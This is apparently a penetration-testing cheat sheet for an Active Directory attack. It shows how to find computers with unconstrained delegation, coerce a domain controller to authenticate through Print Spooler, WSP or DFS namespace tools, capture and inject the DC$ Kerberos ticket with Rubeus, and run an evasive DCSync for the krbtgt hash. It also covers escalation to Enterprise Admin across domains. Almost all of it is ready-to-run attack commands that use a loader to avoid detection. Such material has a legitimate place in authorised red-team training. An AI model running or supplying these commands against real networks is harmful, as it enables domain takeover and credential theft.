# Unconstrained Delegation + Coercion

A machine with unconstrained delegation stores TGTs of connecting users. Coerce the DC to connect → capture DC$ TGT → DCSync.

## Find Unconstrained Delegation Computers
```powershell
Get-DomainComputer -Unconstrained | select name
# or
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

## Setup Rubeus Monitor on Delegation Machine
Run from the delegation machine (requires local admin):
```
Loader.exe -path Rubeus.exe -args monitor /targetuser:<DC_NAME>$ /interval:5 /nowrap
```

## Coerce DC Authentication (choose one)

### MS-RPRN (Print Spooler)
```powershell
.\MS-RPRN.exe \\<DC> \\<DELEGATION_MACHINE>
```

### MS-WSP (Search)
```powershell
.\SharpWSP.exe \\<DC> \\<DELEGATION_MACHINE>
```

### MS-DFSNM (DFS Namespace)
```powershell
.\SharpDFSCoerce.exe -t <DC> -l <DELEGATION_MACHINE>
```

## Inject Captured TGT
Once Rubeus captures the DC$ TGT:
```
Loader.exe -path Rubeus.exe -args ptt /ticket:<base64_ticket>
```

## DCSync with Captured TGT
```
Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-dcsync /user:<domain>\krbtgt" "exit"
```

## Cross-Domain (Enterprise Admin)
Coerce parent DC to connect to child delegation machine:
```
Loader.exe -path Rubeus.exe -args monitor /targetuser:<PARENT_DC>$ /interval:5 /nowrap
# Then coerce PARENT_DC → child delegation machine
# Inject captured PARENT_DC$ TGT → DCSync parent domain → EA
```
